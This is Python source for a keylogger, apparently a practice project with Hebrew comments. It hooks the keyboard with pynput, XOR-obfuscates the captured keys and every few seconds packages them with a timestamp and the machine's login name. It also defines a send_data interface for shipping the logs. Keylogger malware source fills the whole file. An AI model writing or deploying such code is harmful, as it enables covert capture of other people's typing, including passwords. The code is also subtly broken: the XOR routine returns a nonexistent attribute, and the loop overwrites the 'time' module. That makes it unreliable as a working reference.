from pynput import keyboard
from abc import ABC, abstractmethod
import threading


#מחלקה שמפעילה את התוכנית או מכבה
class IKeyLogger(ABC):
    def __init__(self):
        self.text = []
        
    @abstractmethod
    def start_logging(self):
        pass
                          
    @abstractmethod
    def stop_logging(self):
        pass

    @abstractmethod
    def get_logged_keys(self):
        pass
        



#מחלקה שכותבת את המילים המתקבלות לתוך קובץ טקסט
class IWriter(ABC):
    @abstractmethod
    def send_data(self, data: str, machine_name: str):
        pass

        

#xor מחלקה שמצפינה מילים באמצעות
class Encryptor:
    def encryption_using_xor(self,data,key):
        encrypted_text = ''
        try:
            for i, word in enumerate(data):
                if word == '[' or word == ']':
                    continue
                else:    
                    encrypted_text += chr(ord(word) ^ key * i)
            print (encrypted_text)    
            return self.encrypted_text
        except:
             return encrypted_text
    #דוגמא לשימוש בהצפנה
# a = Encryptor()
# b = a.encryption_using_xor('yosef taktuk ashkelon',4) 
# a.encryption_using_xor(b,4)



class KeyLoggerService(IKeyLogger):
    def __init__(self):
    
        self.listener = None
        super().__init__()
    def start_logging(self): 
        
        def on_press(key):
            if key == keyboard.Key.enter:
                self.text.append(key)
            elif key == keyboard.Key.tab:
                self.text.append(key)
            elif key == keyboard.Key.space:
                self.text.append(' ') 
            elif key == keyboard.Key.shift:
                pass
            elif key == keyboard.Key.backspace and len(self.text) == 0:
                pass
            elif key == keyboard.Key.backspace and len(self.text) > 0:
                self.text = self.text[:-1]
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                pass
            elif key == keyboard.Key.esc:
                return False
            else:
                self.text.append(key)
                print(self.text)
        self.listener = keyboard.Listener(on_press=on_press) 
        self.listener.start()       
        # with keyboard.Listener(
        #     on_press=on_press) as self.listener:
        #     self.listener.start()       

    def stop_logging(self):
        if self.start_logging:
            self.listener.stop() 
    def get_logged_keys(self):
        return self.text


                     
# a = KeyLoggerService()
# a.start_logging()
# b = FileWriter()
# b.send_data()
class KeyLoggerManager(KeyLoggerService):
    def __init__(self):
        super().__init__()

    def start(self):
            from datetime import datetime
            import time, os, json
            machine = os.getlogin()
            self.start_logging()
            self.Encryption = Encryptor()
            while True:
                    import time
                    time.sleep(5)
                    time = str(datetime.now())
                    jeson = {'time':time,'data':self.Encryption.encryption_using_xor(str(self.text),4),'machine':machine}
                    json.dumps(jeson,ensure_ascii=False)
                    print(jeson)
                    self.text.clear()
                    
                    
                    
                
c = KeyLoggerManager()
c.start()
